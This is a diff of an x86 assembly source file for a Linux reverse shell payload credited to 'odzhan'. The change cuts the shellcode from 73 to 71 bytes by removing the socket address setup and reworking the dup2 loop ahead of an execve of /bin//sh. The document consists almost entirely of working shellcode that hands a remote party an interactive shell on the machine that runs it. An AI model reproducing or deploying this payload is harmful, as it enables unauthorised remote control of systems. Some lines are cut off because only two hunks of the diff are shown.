@@ -28,20 +28,12 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
 
-; 73 byte reverse shell for linux/x86
+; 71 byte reverse shell for linux/x86
 ; odzhan
 
     bits 32
 
     ; setup sock_addr
-    mov    eax, ~0x00000000 & 0xFFFFFFFF ; ADDR_ANY
-    mov    edx, ~0xD2040002 & 0xFFFFFFFF  ; 1234, AF_INET
-    not    eax
-    not    edx
-    push   eax
-    push   edx
-    mov    ebp, esp
-    
     xor    ebx, ebx          ; ebx=0
     mul    ebx               ; eax=0, edx=0
     ; step 1, create a socket
@@ -85,18 +77,17 @@
     ; dup2(s, FILENO_STDIN); 
     ; dup2(s, FILENO_STDOUT); 
     ; dup2(s, FILENO_STDERR); 
-    push   2
+    push   3
     pop    ecx               ; ecx=2
     xchg   ebx, eax          ; ebx=s
 dup_loop:
     push   0x3f
     pop    eax               ; eax=sys_dup2
-    int    0x80
     dec    ecx
-    jns    dup_loop
+    int    0x80
+    jnz    dup_loop
     
     ; step 6, execute /bin//sh
-    inc    ecx
     mov    al, 0xb           ; eax=sys_execve
     push   ecx
     push   '//sh'            ; 
